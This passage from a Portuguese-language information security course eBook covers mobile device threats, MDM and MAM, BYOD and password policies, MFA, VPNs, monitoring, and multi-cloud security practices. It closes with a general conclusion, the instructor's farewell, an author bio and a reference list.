Dispositivos móveis são frequentemente transportados para fora dos 
ambientes corporativos, o que aumenta o risco de serem perdidos ou 
roubados. Se o dispositivo não estiver adequadamente protegido, dados 
sensíveis podem ser acessados por terceiros. 
1.2. Malware Móvel 
• 
Os dispositivos móveis são alvos crescentes de malware, incluindo 
trojans, spyware e ransomware. Esses malwares podem ser instalados 
por meio de aplicativos falsos ou downloads maliciosos, comprometendo 
a segurança dos dados e das comunicações. 
1.3. Phishing e Engenharia Social 
• 
Os ataques de phishing via e-mail, SMS ou aplicativos de mensagens 
podem levar os usuários a compartilhar credenciais ou informações 
confidenciais com invasores. 
1.4. Redes Wi-Fi Inseguras 
• 
Quando conectados a redes Wi-Fi públicas ou não seguras, os 
dispositivos móveis podem ser vulneráveis a ataques de man-in-the-
middle, onde os dados transmitidos são interceptados. 
1.5. Acessos Não Autorizados 
• 
A falta de controles de autenticação ou o uso de senhas fracas pode 
permitir que invasores acessem dados corporativos armazenados ou 
acessados por dispositivos móveis. 
 
2. Gerenciamento de Dispositivos Móveis: Soluções e Práticas 
 
Para mitigar as ameaças e garantir a segurança dos dispositivos móveis, as 
empresas implementam soluções de MDM (Mobile Device Management) e 
MAM (Mobile Application Management), além de adotar práticas e políticas de 
segurança robustas. A seguir, detalharemos essas abordagens: 
 
2.1. MDM (Mobile Device Management) 
O Mobile Device Management (MDM) é uma tecnologia que permite que as 
organizações monitorem, gerenciem e protejam dispositivos móveis de forma 
centralizada. As soluções de MDM oferecem ferramentas para controlar o uso 
de dispositivos móveis dentro da organização, configurar políticas de segurança, 
aplicar criptografia, e realizar monitoramento remoto. 
Funcionalidades de MDM: 
• 
Configuração de Políticas de Segurança: Definição de senhas seguras, 
criptografia de dados e configurações de bloqueio automático. 
• 
Monitoramento e Rastreamento: Monitoramento remoto de dispositivos 
para verificar conformidade com políticas e rastreamento de localização 
em caso de perda ou roubo. 

 
 
• 
Wipe Remoto (Apagamento Remoto): Permite que dados sensíveis 
sejam apagados remotamente de um dispositivo perdido ou roubado. 
• 
Controle de Aplicativos: Restrição de instalação de aplicativos não 
autorizados e gerenciamento do uso de aplicativos corporativos. 
Exemplo de Uso: 
Uma empresa que permite o uso de dispositivos móveis para acessar e-mails 
corporativos implementa uma solução de MDM, como Microsoft Intune ou 
VMware AirWatch. Isso garante que todos os dispositivos móveis que acessam 
a rede da empresa tenham criptografia ativada, usem senhas seguras e possam 
ser apagados remotamente em caso de perda. 
2.2. MAM (Mobile Application Management) 
O Mobile Application Management (MAM), ou Gerenciamento de Aplicações 
Móveis, é uma abordagem que foca no controle e segurança dos aplicativos 
corporativos instalados em dispositivos móveis. Diferente do MDM, que gerencia 
o dispositivo inteiro, o MAM foca apenas nos aplicativos e nos dados usados por 
esses aplicativos. 
Funcionalidades de MAM: 
• 
Contêinerização de Aplicativos: Criação de um espaço isolado 
(contêiner) dentro do dispositivo móvel onde os aplicativos corporativos 
são executados, separando-os dos aplicativos pessoais. 
• 
Controle de Acesso a Dados: Restringe a capacidade dos usuários de 
copiar ou compartilhar dados entre aplicativos corporativos e pessoais. 
• 
Segurança de Aplicativos Específicos: Políticas como autenticação 
obrigatória, criptografia de dados em trânsito e em repouso, e uso de VPN 
para aplicativos. 
Exemplo de Uso: 
Em uma política BYOD, onde os funcionários usam dispositivos pessoais para o 
trabalho, uma empresa pode optar por usar MAM para garantir que apenas 
aplicativos corporativos estejam sob controle. Isso permite que dados 
confidenciais de e-mails e sistemas de CRM sejam protegidos, enquanto os 
dados pessoais permanecem fora do controle corporativo. 
 
3. Políticas de Segurança para Dispositivos Móveis 
Além das soluções de MDM e MAM, a segurança de dispositivos móveis também 
depende de políticas de segurança bem definidas. Essas políticas orientam 
como os dispositivos móveis devem ser usados no ambiente corporativo e quais 
são os controles de segurança aplicáveis. 
 
3.1. Política de BYOD (Bring Your Own Device) 
• 
O BYOD permite que os funcionários usem seus próprios dispositivos 
para acessar dados e sistemas da empresa. No entanto, essa prática 
pode aumentar os riscos de segurança se não houver políticas adequadas 
para gerenciar esses dispositivos. 
Exemplo de Política BYOD: 
• 
Registro de Dispositivos: Todos os dispositivos usados para fins 
corporativos devem ser registrados na solução MDM da empresa. 
• 
Criptografia Obrigatória: Todos os dados corporativos armazenados no 
dispositivo devem ser criptografados. 
• 
Autenticação Multifator: O acesso a dados e aplicativos corporativos 
deve exigir autenticação multifator (MFA). 
3.2. Política de Senhas Fortes 

 
 
• 
Uma política de senhas fortes é essencial para proteger dispositivos 
móveis contra acessos não autorizados. As senhas devem ser complexas 
e regularmente alteradas. 
Exemplos de Políticas de Senhas: 
• 
Senhas com um mínimo de 8 caracteres, combinando letras maiúsculas, 
minúsculas, números e símbolos. 
• 
Bloqueio automático do dispositivo após um número determinado de 
tentativas de login falhadas. 
3.3. Política de Atualizações e Patches 
• 
Garantir que todos os dispositivos móveis sejam atualizados regularmente 
com patches de segurança é crucial para evitar vulnerabilidades. 
Exemplo de Política: 
• 
Atualizações automáticas de sistema operacional e aplicativos devem 
estar ativadas em todos os dispositivos móveis registrados. 
 
4. Autenticação e Controle de Acesso 
 
4.1. Autenticação Multifator (MFA) 
• 
A autenticação multifator (MFA) adiciona uma camada extra de 
segurança, exigindo que os usuários forneçam mais de uma forma de 
autenticação (por exemplo, uma senha e um código de verificação 
enviado ao smartphone). 
Exemplo de Uso: 
Uma empresa pode exigir que todos os usuários de dispositivos móveis ativem 
o MFA para acessar sistemas corporativos críticos, como e-mails e bancos de 
dados. 
4.2. Controle de Acesso com VPN 
• 
Dispositivos móveis que acessam redes corporativas devem usar uma 
VPN (Virtual Private Network) para garantir que a comunicação entre o 
dispositivo e a rede corporativa seja segura e criptografada. 
Exemplo de Uso: 
Um funcionário em home office usa uma VPN para se conectar à rede da 
empresa ao acessar documentos e ferramentas de colaboração. Isso garante 
que seus dados estejam protegidos durante o trânsito, mesmo que esteja usando 
uma rede Wi-Fi pública. 
 
5. Monitoramento e Auditoria de Dispositivos Móveis 
Além de políticas e soluções de gerenciamento, é fundamental que as 
organizações monitorem continuamente os dispositivos móveis que acessam 
sua rede. Logs de atividade, relatórios de conformidade e auditorias regulares 
ajudam a identificar possíveis problemas de segurança e garantir que os 
dispositivos estejam em conformidade com as políticas estabelecidas. 
Monitoramento Contínuo: 
• 
Monitorar o uso de dispositivos móveis para garantir que não haja 
comportamentos anômalos ou atividades suspeitas, como tentativas de 
acessar dados confidenciais de fora de áreas autorizadas. 
Auditorias de Conformidade: 
• 
Realizar auditorias periódicas dos dispositivos móveis para garantir que 
eles estejam em conformidade com as políticas de segurança da 
organização. 
 

 
 
O gerenciamento de segurança em dispositivos móveis é essencial para 
proteger dados corporativos e garantir que dispositivos, sejam eles corporativos 
ou pessoais, estejam em conformidade com as políticas de segurança. Usar 
soluções de MDM e MAM, implementar políticas rigorosas de BYOD, senhas 
fortes e autenticação multifator, além de monitorar continuamente o uso de 
dispositivos, são práticas essenciais para minimizar os riscos e garantir a 
segurança das informações acessadas e armazenadas em dispositivos móveis. 
 
5.4. DESAFIOS E BOAS PRÁTICAS: SEGURANÇA EM AMBIENTES MULTI-
CLOUD E BYOD (BRING YOUR OWN DEVICE) 
 
Com a crescente adoção de ambientes multi-cloud e a popularidade das 
políticas de BYOD (Bring Your Own Device), as organizações enfrentam novos 
desafios de segurança. Esses dois paradigmas oferecem maior flexibilidade e 
eficiência, mas também ampliam a superfície de ataque e exigem uma 
abordagem robusta e estratégica para proteger dados e sistemas. 
Neste conteúdo, vamos abordar os principais desafios de segurança em 
ambientes multi-cloud e BYOD, e as boas práticas recomendadas para 
minimizar riscos e garantir a proteção de informações sensíveis. 
 
1. Ambientes Multi-Cloud: Desafios de Segurança 
 
O termo multi-cloud refere-se ao uso de múltiplos provedores de serviços de 
nuvem para atender às necessidades de TI de uma organização. Esse modelo 
oferece benefícios como flexibilidade, otimização de custos e redundância. No 
entanto, também traz desafios complexos de segurança, pois cada provedor de 
nuvem possui suas próprias configurações, APIs e ferramentas de segurança. 
 
Desafios de Segurança em Ambientes Multi-Cloud: 
1.1. Gerenciamento de Segurança Fragmentado 
• 
Cada provedor de nuvem pode ter suas próprias políticas, controles e 
ferramentas de segurança. A coordenação de várias plataformas exige 
um esforço significativo para garantir a uniformidade e a consistência das 
políticas de segurança. 
1.2. Visibilidade e Monitoramento Limitados 
• 
Com várias nuvens sendo utilizadas, a visibilidade sobre o tráfego de 
dados, o acesso a recursos e a conformidade pode ser fragmentada, 
tornando difícil identificar e responder a incidentes de segurança em 
tempo real. 
1.3. Controle de Acesso Complexo 
• 
Implementar políticas de acesso e autenticação consistentes entre 
diferentes provedores pode ser desafiador. Se os controles de identidade 
e acesso (IAM) não forem coordenados adequadamente, há risco de 
brechas de segurança. 
1.4. Conformidade e Regulação 
• 
Diferentes provedores de nuvem podem oferecer suporte variável a 
regulamentações como LGPD ou GDPR. Garantir que todos os dados 
estejam em conformidade com as exigências regulatórias em todas as 
nuvens é um desafio. 
1.5. Gestão de Configurações de Segurança 

 
 
• 
As configurações incorretas ou inconsistentes entre provedores podem 
abrir brechas de segurança, como a exposição acidental de dados ou a 
má configuração de permissões. 
 
Boas Práticas para Segurança em Ambientes Multi-Cloud: 
 
1.1. Implementar Gerenciamento de Identidade Centralizado (IAM) 
• 
Utilize uma solução de IAM (Identity and Access Management) 
centralizada que unifique o controle de acessos e permissões para todos 
os provedores de nuvem. Isso ajuda a garantir que os usuários tenham o 
nível adequado de acesso, independentemente do ambiente em nuvem. 
Exemplo: Ferramentas como AWS IAM e Azure Active Directory podem ser 
integradas para gerenciar identidades e permissões de forma centralizada. 
1.2. Monitoramento e Visibilidade Unificada 
• 
Implementar ferramentas de SIEM (Security Information and Event 
Management) que ofereçam visibilidade unificada sobre todos os 
ambientes de nuvem, monitorando eventos de segurança, acessos e 
atividades anômalas em tempo real. 
Exemplo: Ferramentas como Splunk ou Palo Alto Prisma Cloud permitem 
monitoramento centralizado e identificação de ameaças em ambientes multi-
cloud. 
1.3. Configuração e Automação de Políticas de Segurança 
• 
Utilize ferramentas de automação de segurança para garantir que as 
configurações de segurança sejam consistentes em todas as nuvens, 
evitando erros manuais e má configuração de permissões. 
Exemplo: Soluções como HashiCorp Terraform permitem automatizar a 
configuração de segurança em múltiplos provedores, garantindo conformidade e 
consistência. 
1.4. Criptografia de Dados 
• 
Certifique-se de que todos os dados em repouso e em trânsito estejam 
criptografados em todas as nuvens. Utilize a criptografia oferecida pelos 
próprios provedores de nuvem e configure chaves de criptografia 
gerenciadas pela empresa. 
1.5. Auditoria e Conformidade Regular 
• 
Realize auditorias de conformidade em todos os ambientes de nuvem 
para garantir que suas configurações atendem a regulamentações como 
a LGPD ou GDPR. 
 
2. Desafios de Segurança no BYOD (Bring Your Own Device) 
 
O BYOD (Bring Your Own Device) permite que os funcionários usem seus 
próprios dispositivos pessoais, como smartphones e laptops, para acessar 
sistemas e dados corporativos. Embora essa prática ofereça flexibilidade e 
conveniência, ela também expõe as organizações a novos riscos de segurança. 
Desafios de Segurança no BYOD: 
 
2.1. Controle de Acesso 
• 
Dispositivos pessoais nem sempre seguem as mesmas políticas de 
segurança de dispositivos corporativos. Garantir que apenas usuários 
autorizados tenham acesso aos dados e sistemas críticos torna-se mais 
difícil no BYOD. 

 
 
2.2. Dados Mistos (Pessoais e Corporativos) 
• 
Dispositivos BYOD geralmente contêm dados pessoais e corporativos, o 
que dificulta a separação e a proteção de dados sensíveis. Isso aumenta 
o risco de vazamento de informações. 
2.3. Dispositivos Não-Gerenciados 
• 
A falta de controle direto sobre os dispositivos dos funcionários pode 
significar que eles não estão devidamente atualizados, protegidos contra 
malware ou configurados com práticas seguras. 
2.4. Risco de Perda ou Roubo 
• 
Dispositivos móveis são mais suscetíveis a serem perdidos ou roubados. 
Quando isso acontece, os dados corporativos armazenados nesses 
dispositivos podem ser comprometidos. 
2.5. Conexões Não Seguras 
• 
Funcionários que acessam dados corporativos por meio de conexões Wi-
Fi públicas ou redes não seguras correm o risco de exposição a ataques 
de interceptação, como man-in-the-middle. 
 
Boas Práticas para Segurança em Ambientes BYOD: 
 
2.1. Implementar MDM (Mobile Device Management) 
• 
Utilize soluções de MDM (Mobile Device Management) para gerenciar, 
monitorar e proteger dispositivos BYOD. Isso permite que as 
organizações apliquem políticas de segurança, como a criptografia de 
dados e o bloqueio remoto, e garantam que os dispositivos estejam em 
conformidade com as políticas da empresa. 
Exemplo: Ferramentas como Microsoft Intune ou VMware AirWatch permitem 
controlar dispositivos móveis usados para acessar sistemas corporativos. 
2.2. Segmentação de Dados (Contêinerização) 
• 
Implemente a contêinerização de aplicativos, que cria um ambiente 
seguro isolado no dispositivo para aplicativos e dados corporativos, 
garantindo que eles não sejam misturados com dados pessoais. 
Exemplo: Soluções de MAM (Mobile Application Management) permitem 
isolar dados corporativos e evitar o compartilhamento indevido com aplicativos 
pessoais. 
2.3. Autenticação Multifator (MFA) 
• 
Aplique autenticação multifator (MFA) em todos os dispositivos BYOD 
para proteger o acesso aos sistemas e dados corporativos. Isso adiciona 
uma camada extra de segurança além de senhas. 
Exemplo: Configurar MFA em aplicativos corporativos, como e-mails e VPN, 
garante que apenas usuários autenticados tenham acesso. 
2.4. VPN e Criptografia de Dados 
• 
Exija que os funcionários usem VPN (Virtual Private Network) para 
acessar a rede corporativa remotamente. Isso garante que os dados 
transmitidos por redes públicas ou inseguras sejam criptografados. 
Exemplo: Ao acessar sistemas corporativos fora do escritório, a conexão via 
VPN ajuda a proteger contra interceptações em redes Wi-Fi públicas. 
2.5. Políticas de Segurança BYOD 
• 
Desenvolva e implemente políticas claras de BYOD que definam as 
responsabilidades dos funcionários em relação ao uso de dispositivos 
pessoais. A política deve incluir a necessidade de senhas fortes, 
atualizações de software, uso de antivírus e comportamento seguro. 

 
 
2.6. Wipe Remoto (Apagamento Remoto) 
• 
Habilite o wipe remoto, permitindo que os dados corporativos sejam 
excluídos de dispositivos BYOD caso sejam perdidos, roubados ou 
quando um funcionário deixar a empresa. 
Exemplo: Se um dispositivo BYOD for perdido, a equipe de TI pode apagar 
todos os dados corporativos remotamente para garantir que informações 
sensíveis não sejam comprometidas. 
 
Tanto os ambientes multi-cloud quanto o BYOD oferecem flexibilidade e 
eficiência às organizações, mas também apresentam desafios significativos de 
segurança. O gerenciamento eficaz dessas infraestruturas requer uma 
abordagem estratégica que inclui automação de políticas, controle de acesso 
unificado, criptografia de dados, monitoramento contínuo e segurança de 
dispositivos. Ao adotar essas boas práticas, as organizações podem 
minimizar os riscos e garantir que os dados e sistemas estejam protegidos, 
independentemente de onde e como são acessados. 
 
 
 
 

 
 
A Importância dos Princípios de Segurança da Informação 
 
Ao longo da discussão de hoje, abordamos uma variedade de tópicos críticos 
relacionados à segurança da informação, desde conceitos fundamentais, como 
IAM (Identity and Access Management), até temas mais específicos, como 
controle de acesso baseado em papéis (RBAC) e atributos (ABAC), além de 
desafios e boas práticas em multi-cloud, BYOD, e o gerenciamento de 
dispositivos móveis. Juntos, esses princípios formam a base para uma estrutura 
robusta de segurança da informação, essencial para proteger dados, sistemas e 
redes em um mundo cada vez mais digital e interconectado. 
 
1. Identity and Access Management (IAM): O Pilar Central de Controle de 
Acesso 
O IAM é a pedra angular da segurança em qualquer organização, fornecendo as 
ferramentas e processos necessários para garantir que apenas usuários 
autorizados possam acessar sistemas e dados corporativos. Este conceito vai 
além do simples controle de acessos; ele abrange todo o ciclo de vida da 
identidade do usuário, desde sua criação até a revogação de permissões. Em 
um cenário onde as violações de dados muitas vezes são o resultado de acessos 
não autorizados ou comprometidos, a implementação adequada do IAM, com 
funcionalidades como autenticação multifator (MFA) e gerenciamento de 
identidade centralizado, é fundamental para reduzir os riscos. 
Importância na Segurança da Informação: 
• 
Prevenção de Acessos Não Autorizados: Ao garantir que apenas 
usuários autenticados tenham acesso aos recursos corretos, o IAM 
protege dados sensíveis contra uso indevido. 
• 
Controle de Privilégios: O IAM facilita a aplicação do princípio de menor 
privilégio, reduzindo o risco de insiders com acesso excessivo causarem 
danos. 
 
2. Controle de Acesso Baseado em Papéis (RBAC) e Atributos (ABAC) 
Os modelos de controle de acesso, como RBAC e ABAC, fornecem diferentes 
abordagens para gerenciar quem pode acessar o que dentro de uma 
organização. O RBAC simplifica a atribuição de permissões ao associá-las a 
papéis, enquanto o ABAC oferece uma flexibilidade maior, permitindo que as 
permissões sejam baseadas em atributos mais dinâmicos, como localização, 
horário ou nível de confidencialidade dos dados. 
Importância na Segurança da Informação: 
• 
Simplificação e Flexibilidade: O RBAC é ideal para ambientes com 
funções claras, facilitando o gerenciamento de permissões, enquanto o 
ABAC se adapta a cenários mais complexos e dinâmicos. 
• 
Redução de Riscos de Violação: Ambos os modelos garantem que os 
usuários tenham acesso apenas ao que realmente precisam, minimizando 
a superfície de ataque e prevenindo o uso indevido de dados sensíveis. 
 
3. Gerenciamento de Segurança em Dispositivos Móveis e BYOD 
Com o aumento do uso de dispositivos móveis e a popularidade de políticas 
BYOD (Bring Your Own Device), garantir a segurança de dispositivos pessoais 
que acessam sistemas corporativos tornou-se essencial. O uso de soluções de 
MDM 
(Mobile 
Device 
Management) 
e 
MAM 
(Mobile 
Application 
Management) permite que as empresas mantenham o controle sobre os 

 
 
dispositivos, garantam a separação entre dados corporativos e pessoais e 
implementem medidas como wipe remoto em caso de perda ou roubo. 
Importância na Segurança da Informação: 
• 
Proteção de Dados em Movimento: Com dispositivos móveis 
acessando dados de qualquer lugar, o uso de VPNs e criptografia se torna 
essencial para proteger informações durante a transmissão. 
• 
Segurança Descentralizada: O controle centralizado sobre dispositivos 
móveis e a capacidade de aplicar políticas de segurança remotamente 
permitem que as organizações mantenham seus dados seguros, 
independentemente de onde ou como estão sendo acessados. 
 
4. Ambientes Multi-Cloud: Desafios e Boas Práticas 
O uso de múltiplos provedores de nuvem (multi-cloud) oferece às empresas 
flexibilidade, redundância e otimização de custos, mas também traz desafios 
significativos em termos de visibilidade e controle de segurança. Garantir uma 
configuração de segurança uniforme e gerenciar o acesso de forma centralizada 
são tarefas complexas em um ambiente multi-cloud. 
Importância na Segurança da Informação: 
• 
Uniformidade nas Políticas de Segurança: Implementar políticas 
consistentes entre diferentes provedores de nuvem evita vulnerabilidades 
decorrentes de configurações inconsistentes. 
• 
Visibilidade e Monitoramento Unificado: A capacidade de monitorar e 
auditar eventos de segurança em tempo real em todos os ambientes de 
nuvem é essencial para detectar e responder rapidamente a incidentes. 
 
5. Monitoramento e Auditoria de Acessos 
O monitoramento e a auditoria de acessos são componentes essenciais para 
garantir que as políticas de controle de acesso estejam sendo seguidas e que 
quaisquer comportamentos anômalos ou suspeitos sejam identificados e 
resolvidos rapidamente. Ferramentas de SIEM (Security Information and 
Event Management) são essenciais para agregar e analisar dados de diversas 
fontes, permitindo uma visão centralizada de todos os eventos de segurança. 
Importância na Segurança da Informação: 
• 
Resposta a Incidentes em Tempo Real: O monitoramento contínuo 
permite que as equipes de segurança identifiquem e respondam 
rapidamente a comportamentos suspeitos, minimizando o impacto de 
possíveis violações. 
• 
Conformidade e Auditoria: A auditoria regular dos registros de acesso 
é crucial para garantir que a organização esteja em conformidade com 
regulamentações de proteção de dados, como LGPD e GDPR. 
 
6. Segurança em Camadas e o Modelo de Responsabilidade Compartilhada 
No contexto de cloud computing, o modelo de responsabilidade 
compartilhada divide as responsabilidades de segurança entre o provedor de 
serviços de nuvem e o cliente. Enquanto o provedor é responsável pela 
infraestrutura subjacente (segurança da nuvem), o cliente deve gerenciar a 
segurança dos dados, aplicações e configurações (segurança na nuvem). 
Importância na Segurança da Informação: 
• 
Colaboração Efetiva: O modelo de responsabilidade compartilhada 
exige que as organizações compreendam claramente seus papéis e 

 
 
responsabilidades em relação à segurança, garantindo que ambos 
(cliente e provedor) implementem as medidas adequadas. 
• 
Proteção de Dados Sensíveis: A capacidade de criptografar dados em 
repouso e em trânsito, controlar o acesso e monitorar a conformidade em 
tempo real garante que as informações críticas estejam sempre 
protegidas. 
 
 
Conclusão Geral 
Os princípios discutidos hoje são fundamentais para a construção de uma 
arquitetura de segurança da informação robusta e eficaz. Cada um dos tópicos 
abordados desempenha um papel essencial na proteção de dados, redes e 
sistemas, desde o controle de acesso centralizado e a gestão de dispositivos 
móveis até a segurança em ambientes multi-cloud. 
Em um mundo cada vez mais digitalizado e com uma superfície de ataque cada 
vez maior, as organizações precisam adotar uma abordagem proativa e 
multicamadas para a segurança da informação. Isso inclui a aplicação rigorosa 
de políticas de controle de acesso, o monitoramento contínuo de atividades, o 
uso de criptografia, e a implementação de soluções de automação para garantir 
a conformidade. Além disso, entender e aplicar o modelo de responsabilidade 
compartilhada no contexto de cloud computing é crucial para garantir que tanto 
os provedores de nuvem quanto os clientes estejam fazendo sua parte para 
proteger o ecossistema digital. 
Esses princípios, quando aplicados de forma integrada e estratégica, não 
apenas ajudam a mitigar os riscos cibernéticos, mas também garantem que as 
organizações estejam preparadas para responder a novos desafios e ameaças 
emergentes no campo da segurança da informação. 
4o 
 
 
 
 
 

 
 
FINALIZAR 
 
Terminamos aqui nossa jornada nessa disciplina de princípios de segurança da 
informação. Foi um conteúdo com alguns tópicos importante que vão ajudar você 
a dar passos importantes com outros temas dentro da área de segurança da 
informação. 
 
Eu agradeço seu comprometimento e dedicação, espero que o material aqui 
apresentado lhe seja útil no seu cotidiano com essa área tão importante que é 
segurança da informação, e lhe dê insumos suficientes para ter um bom alicerce 
de vários assuntos importantes para que você possa continuar a se desenvolver 
posteriormente e por conta própria. 
 
Tenho certeza que ao terminar essa disciplina, você sai com um conhecimento 
nivelado e bem fundamentado para lidar com desafios diversos como ameaças, 
diferentes times de segurança além de conseguir navegar em temas como 
criptografia, segurança em redes, gestão de acessos, além de uma base para 
cloud security. 
 
Eu acredito que a área de segurança da informação tem como característica de 
ser parte do negócio, e não uma área definidora de regras e apenas zelando pelo 
cumprimento delas. Claro, isso faz parte do trabalho do profissional de 
segurança, mas fazer parte do negócio, saber aplicar regras sem criar mais 
fricção, ter empatia pelos problemas e desafios do próximo e/ou da companhia, 
são diferenciais que eu convido você a exercitar na sua jornada profissional. 
 
Lembre-se, sua jornada não termina aqui, continue se aprimorando e buscando 
conhecimentos nessa área vasta e tão plural que é segurança da informação. 
 
Parabenizo você por sua trajetória e dedicação neste curso. Desejo-lhe sucesso 
em sua trajetória profissional e espero que as pílulas de conhecimento trazidas 
neste material especialmente para você, lhe proporcione um pouco mais de valor 
agregado na sua jornada profissional e suas experiências. 
 
Prof. Rodrigo Muniz 
 
 

 
 
SOBRE O AUTOR 
 
Rodrigo Muniz é um profissional da área de segurança da informação com mais 
de uma década trabalhando com segurança da informação e quase duas 
décadas atuando na área de tecnologia. Passou por diversas áreas e disciplinas 
de segurança da informação, onde nos últimos anos trabalhou diretamente com 
áreas técnicas envolvendo segurança ofensiva, segurança de aplicações e 
arquitetura de segurança. Também é especialista em segurança de produtos e 
segurança em Cloud Computing. Pós-graduado em Gestão de Segurança da 
Informação, possui vasta experiência em gestão e liderança técnica. 
 
 
 

 
 
REFERÊNCIAS BIBLIOGRÁFICAS 
 
KIM, David; SOLOMON, Michael. Fundamentos de segurança de sistemas de 
informação: engloba riscos e ameaças advindas das mudanças digitais. Rio de 
Janeiro: LTC, 2014. (Minha Biblioteca).  
 
MACHADO, Felipe Nery Rodrigues. Segurança da informação: princípios e 
controle de ameaças. São Paulo: Erica, 2019. Ebook. (Minha Biblioteca).  
 
FONTES, Edison. Políticas e normas para a segurança da informação: como 
desenvolver, implantar e manter regulamentos para a proteção da informação 
nas organizações. Rio de Janeiro: Brasport, 2012. E-book. (Biblioteca Pearson).  
 
GOODRICH, Michael. Introdução à segurança de computadores: conceitos 
básicos e criptográficos, segurança física, segurança de sistemas operacionais, 
segurança web etc. Porto Alegre: Bookman, 2012. Ebook. (Minha Biblioteca).  
 
SILVA, Michel Bernardo Fernandes da. Cibersegurança: uma visão panorâmica 
sobre a segurança da informação na internet. Rio de Janeiro: Freitas Bastos, 
2023. E-book. (Biblioteca Pearson).   
 
PINHEIRO, Patrícia Peck. Segurança Digital: Proteção de Dados nas 
Empresas, São Paulo: Atlas, 2020. Ebook. (Minha Biblioteca).  
 
PINHEIRO, Patrícia Peck. Segurança da informação e meios de pagamento 
eletrônicos: tendências sobre segurança digital, uso de IA, reconhecimento 
facial e biometria e redução de crimes cibernéticos. Ed. Curitiba: Intersaberes, 
2022. E-book. (Biblioteca Pearson). 
 
MARINHO, Fernando. Os 10 mandamentos da LGPD: como implementar a Lei 
Geral de Proteção de Dados em 14 passos. São Paulo: Atlas, 2020. E-book. 
(Minha Biblioteca).  
 
 
 
 


--- Fim do arquivo: eBook - Princípios de Segurança.pdf ---

